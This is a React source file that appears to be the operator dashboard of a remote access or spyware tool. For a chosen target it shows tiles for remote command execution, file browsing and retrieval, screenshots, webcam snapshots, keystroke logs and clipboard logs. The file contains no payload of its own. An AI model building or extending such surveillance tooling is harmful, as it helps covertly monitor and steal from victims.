import React from "react";
import Api from "containers/Api";
import { Responsive, WidthProvider, Layout } from "react-grid-layout";
import { useState } from "@hook-state/core";
import Terminal from "./tiles/Terminal";
import TerminalOutput from "./tiles/TerminalOutput";
import FileExplorer from "./tiles/FileExplorer";
import ImageView from "./tiles/ImageView";
import TextListView from "./tiles/TextListView";

const GridLayout = WidthProvider(Responsive);

export default function Main() {
  const api = Api.use();

  const features = (features: string[]) => {
    for (let f of features) {
      if (api.target.features.indexOf(f) === -1) return false;
    }
    return true;
  };

  const [layouts, setLayouts] = useState<Layout[]>(
    [
      { i: "Terminal", x: 4, y: 0, w: 4, h: 2 },
      { i: "Terminal Output", x: 4, y: 1, w: 4, h: 6 },
      { i: "File Explorer", x: 0, y: 0, w: 4, h: 14 },
      { i: "Screenshot", x: 8, y: 0, w: 4, h: 8 },
      { i: "Webcam", x: 8, y: 4, w: 4, h: 8 },
      { i: "Key Log", x: 4, y: 7, w: 4, h: 6 },
      { i: "Clipboard Log", x: 4, y: 7, w: 4, h: 6 }
    ],
    { persist: `layout-${api.target.name}` }
  );
  const tiles = [
    { component: <Terminal />, features: ["EXEC"], key: "Terminal" },
    {
      component: <TerminalOutput />,
      features: ["EXEC"],
      key: "Terminal Output"
    },
    {
      component: <FileExplorer />,
      features: ["FILE", "LS", "REQUEST_FILE"],
      key: "File Explorer"
    },
    {
      component: <ImageView name="Screenshot" event="SCREENSHOT" />,
      features: ["SCREENSHOT"],
      key: "Screenshot"
    },
    {
      component: <ImageView name="Webcam" event="WEBCAM_SNAP" />,
      features: ["WEBCAM_SNAP"],
      key: "Webcam"
    },
    {
      component: <TextListView name="Key log" event="DUMP_KEY_LOG" />,
      features: ["DUMP_KEY_LOG"],
      key: "Key Log"
    },
    {
      component: (
        <TextListView name="Clipboard log" event="DUMP_CLIPBOARD_LOG" />
      ),
      features: ["DUMP_CLIPBOARD_LOG"],
      key: "Clipboard Log"
    }
  ];

  return (
    <div style={{ margin: 20 }}>
      <div>
        <GridLayout
          draggableCancel=".nodrag"
          isDraggable
          isRearrangeable
          isResizable
          onLayoutChange={a => setLayouts(a)}
          cols={{ lg: 12, md: 12, sm: 6, xs: 4, xxs: 2 }}
          rowHeight={25}
          layouts={{
            lg: layouts
          }}
        >
          {tiles
            .filter(t => features(t.features))
            .map(tile => (
              <div key={tile.key}>{tile.component}</div>
            ))}
        </GridLayout>
      </div>
    </div>
  );
}
